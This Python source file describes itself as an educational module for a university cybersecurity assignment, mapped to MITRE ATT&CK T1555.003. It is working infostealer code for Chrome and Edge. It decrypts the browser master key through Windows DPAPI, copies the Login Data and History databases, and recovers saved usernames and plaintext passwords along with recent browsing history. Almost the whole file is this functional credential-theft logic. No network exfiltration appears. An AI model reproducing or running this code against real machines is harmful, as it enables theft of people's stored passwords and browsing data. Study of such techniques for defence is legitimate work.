"""
Browser Data Extraction Module - Chrome & Edge
MITRE ATT&CK: T1555.003 (Credentials from Password Stores: Credentials from Web Browsers)
EDUCATIONAL PURPOSE ONLY - RMIT Cybersecurity Assignment

Extracts saved passwords and browsing history from Chromium-based browsers
(Chrome and Edge). Uses DPAPI decryption (per-user, no admin needed).
Only works as the same Windows user who saved the passwords.
"""

import os
import json
import base64
import sqlite3
import shutil
import tempfile
from datetime import datetime

try:
    import win32crypt
    HAS_WIN32CRYPT = True
except ImportError:
    HAS_WIN32CRYPT = False

try:
    from Crypto.Cipher import AES
    HAS_PYCRYPTODOME = True
except ImportError:
    HAS_PYCRYPTODOME = False


# Browser paths (Chromium-based)
BROWSER_PATHS = {
    "chrome": {
        "local_state": os.path.join(
            os.environ.get("LOCALAPPDATA", ""),
            "Google", "Chrome", "User Data", "Local State"
        ),
        "login_data": os.path.join(
            os.environ.get("LOCALAPPDATA", ""),
            "Google", "Chrome", "User Data", "Default", "Login Data"
        ),
        "history": os.path.join(
            os.environ.get("LOCALAPPDATA", ""),
            "Google", "Chrome", "User Data", "Default", "History"
        ),
    },
    "edge": {
        "local_state": os.path.join(
            os.environ.get("LOCALAPPDATA", ""),
            "Microsoft", "Edge", "User Data", "Local State"
        ),
        "login_data": os.path.join(
            os.environ.get("LOCALAPPDATA", ""),
            "Microsoft", "Edge", "User Data", "Default", "Login Data"
        ),
        "history": os.path.join(
            os.environ.get("LOCALAPPDATA", ""),
            "Microsoft", "Edge", "User Data", "Default", "History"
        ),
    }
}


def get_chrome_master_key(browser="chrome"):
    """
    Read the AES master key from the browser's Local State file.
    Chrome v80+ encrypts passwords with AES-GCM using this key,
    which itself is protected by Windows DPAPI.
    """
    if not HAS_WIN32CRYPT:
        return None

    local_state_path = BROWSER_PATHS.get(browser, {}).get("local_state", "")
    if not os.path.exists(local_state_path):
        return None

    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(encrypted_key_b64)

        # Strip the "DPAPI" prefix (first 5 bytes)
        encrypted_key = encrypted_key[5:]

        # Decrypt with DPAPI (per-user key, no admin needed)
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key

    except Exception:
        return None


def decrypt_password(encrypted_password, master_key):
    """
    Decrypt a Chrome/Edge password.

    Chrome v80+ uses AES-256-GCM:
      - bytes[3:15]  = 12-byte nonce
      - bytes[15:-16] = ciphertext
      - last 16 bytes = GCM auth tag

    Older versions use direct DPAPI (fallback).
    """
    if not encrypted_password:
        return ""

    try:
        # Chrome v80+ (starts with 'v10' or 'v11')
        if encrypted_password[:3] == b"v10" or encrypted_password[:3] == b"v11":
            if not HAS_PYCRYPTODOME or not master_key:
                return "[encrypted - missing deps]"

            nonce = encrypted_password[3:15]
            ciphertext = encrypted_password[15:-16]
            tag = encrypted_password[-16:]

            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            plaintext = cipher.decrypt_and_verify(ciphertext, tag)
            return plaintext.decode("utf-8", errors="replace")

        else:
            # Older Chrome - direct DPAPI
            if HAS_WIN32CRYPT:
                plaintext = win32crypt.CryptUnprotectData(
                    encrypted_password, None, None, None, 0
                )[1]
                return plaintext.decode("utf-8", errors="replace")
            return "[encrypted - DPAPI unavailable]"

    except Exception:
        return "[decryption failed]"


def extract_browser_passwords(browser="chrome"):
    """
    Extract saved passwords from a Chromium browser.

    Copies the locked Login Data SQLite database to a temp file,
    queries it, and decrypts each password.

    Returns:
        list of dicts with url, username, password
    """
    login_data_path = BROWSER_PATHS.get(browser, {}).get("login_data", "")
    if not os.path.exists(login_data_path):
        return []

    master_key = get_chrome_master_key(browser)
    credentials = []

    # Copy database (it's locked while browser is running)
    temp_db = os.path.join(tempfile.gettempdir(), f"{browser}_login_data_copy.db")
    try:
        shutil.copy2(login_data_path, temp_db)
    except Exception:
        return []

    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute(
            "SELECT origin_url, username_value, password_value FROM logins"
        )

        for row in cursor.fetchall():
            url, username, encrypted_pw = row
            if username:  # Skip entries with no username
                password = decrypt_password(encrypted_pw, master_key)
                credentials.append({
                    "url": url,
                    "username": username,
                    "password": password
                })

        conn.close()
    except Exception:
        pass
    finally:
        # Clean up temp file
        try:
            os.remove(temp_db)
        except Exception:
            pass

    return credentials


def extract_browser_history(browser="chrome"):
    """
    Extract recent browsing history from a Chromium browser.

    Returns:
        list of dicts with url, title, last_visit (last 50 entries)
    """
    history_path = BROWSER_PATHS.get(browser, {}).get("history", "")
    if not os.path.exists(history_path):
        return []

    history = []

    # Copy database (locked while browser running)
    temp_db = os.path.join(tempfile.gettempdir(), f"{browser}_history_copy.db")
    try:
        shutil.copy2(history_path, temp_db)
    except Exception:
        return []

    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute(
            "SELECT url, title, last_visit_time FROM urls "
            "ORDER BY last_visit_time DESC LIMIT 50"
        )

        for row in cursor.fetchall():
            url, title, visit_time = row
            # Chrome timestamps are microseconds since 1601-01-01
            # Convert to readable format
            try:
                epoch = (visit_time / 1000000) - 11644473600
                visit_str = datetime.fromtimestamp(epoch).isoformat()
            except Exception:
                visit_str = str(visit_time)

            history.append({
                "url": url,
                "title": title or "(no title)",
                "last_visit": visit_str
            })

        conn.close()
    except Exception:
        pass
    finally:
        try:
            os.remove(temp_db)
        except Exception:
            pass

    return history


if __name__ == "__main__":
    print("=" * 50)
    print("  Browser Data Extraction Test")
    print("=" * 50)

    if not HAS_WIN32CRYPT:
        print("\n[!] win32crypt not available. Install: pip install pywin32")
    if not HAS_PYCRYPTODOME:
        print("\n[!] pycryptodome not available. Install: pip install pycryptodome")

    for browser_name in ["chrome", "edge"]:
        print(f"\n{'='*40}")
        print(f"  {browser_name.upper()}")
        print(f"{'='*40}")

        # Passwords
        creds = extract_browser_passwords(browser_name)
        if creds:
            print(f"\n[+] Found {len(creds)} saved passwords:")
            for c in creds[:5]:
                masked_pw = c["password"][:3] + "***" if len(c["password"]) > 3 else "***"
                print(f"    URL: {c['url'][:60]}")
                print(f"    User: {c['username']}, Pass: {masked_pw}")
        else:
            print(f"\n[-] No saved passwords found for {browser_name}")

        # History
        history = extract_browser_history(browser_name)
        if history:
            print(f"\n[+] Recent history ({len(history)} entries):")
            for h in history[:5]:
                print(f"    {h['title'][:50]} - {h['url'][:60]}")
        else:
            print(f"\n[-] No history found for {browser_name}")
